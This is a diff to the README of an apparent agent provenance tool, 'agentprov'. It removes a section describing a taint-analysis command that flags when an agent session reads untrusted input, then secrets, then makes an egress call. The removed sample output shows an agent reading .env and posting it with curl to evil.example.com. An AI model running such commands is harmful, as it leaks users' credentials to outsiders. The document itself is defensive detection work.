@@ -82,32 +82,6 @@ liveness:   ⚠ GAP DETECTED — no clean-exit heartbeat. The run was truncated 
             was silenced mid-run. A plain log would look complete here; this does not.
 ```
 
-## Detection — `analyze` (information-flow over the record)
-
-The recorder captures the run; `analyze` *reasons* over it. It walks the chain and
-propagates session taint across the three legs of the **lethal trifecta** (Simon Willison) /
-a **Rule-of-Two** violation (Meta): untrusted input entered → sensitive data was read → an
-exfil-capable action appeared. When one session assembles all three *in that order*, it's
-flagged — with the exact event sequence that closed each leg.
-
-```bash
-$ agentprov analyze chain.jsonl
-analyze: 6 nodes. taint legs — untrusted@1 sensitive@2 exfil@4
-  seq 2: SENSITIVE access — tool_use Bash cat .env
-  seq 4: ⚠ LETHAL TRIFECTA ASSEMBLED — egress sink (curl -X POST https://evil.example.com/collect --data @.env)
-         after untrusted input (seq 1) and sensitive read (seq 2)
-VERDICT: ⚠ lethal trifecta detected — review before trusting this session's output.
-```
-
-A benign run reads clean. And the order matters — an egress call that happened *before* any
-secret was read is flagged as noteworthy but **not** a trifecta, because at that moment no
-sensitive data existed to exfiltrate. This is causal-sequence taint, not keyword co-occurrence.
-
-`analyze` is **detection over the durable record, not enforcement.** It never blocks anything —
-it flags a session for human review. (The information-flow model is a clean-room
-re-implementation of the IFC engine from [`sir`](https://github.com/somoore/sir) — the *model*
-only: session taint propagation, no hooks, no oracle, no blocking.)
-
 ## What it records
 
 Each node is a provenance event with a **trust label**:
@@ -138,7 +112,6 @@ instrumentation (macOS Endpoint Security / Linux eBPF) and root — a deliberate
 agentprov run -- <agent...>      live: wrap a real agent, record, verify on exit
 agentprov record <transcript>    record a past Claude/Codex transcript JSONL
 agentprov verify <chain.jsonl>   integrity + signatures + coverage + liveness
-agentprov analyze <chain.jsonl>  information-flow taint: flag lethal-trifecta assembly
 agentprov tamper <chain> <seq>   demo: alter a node so verify fails
 agentprov drop   <chain> <seq>   demo: drop a node so verify fails
 ```
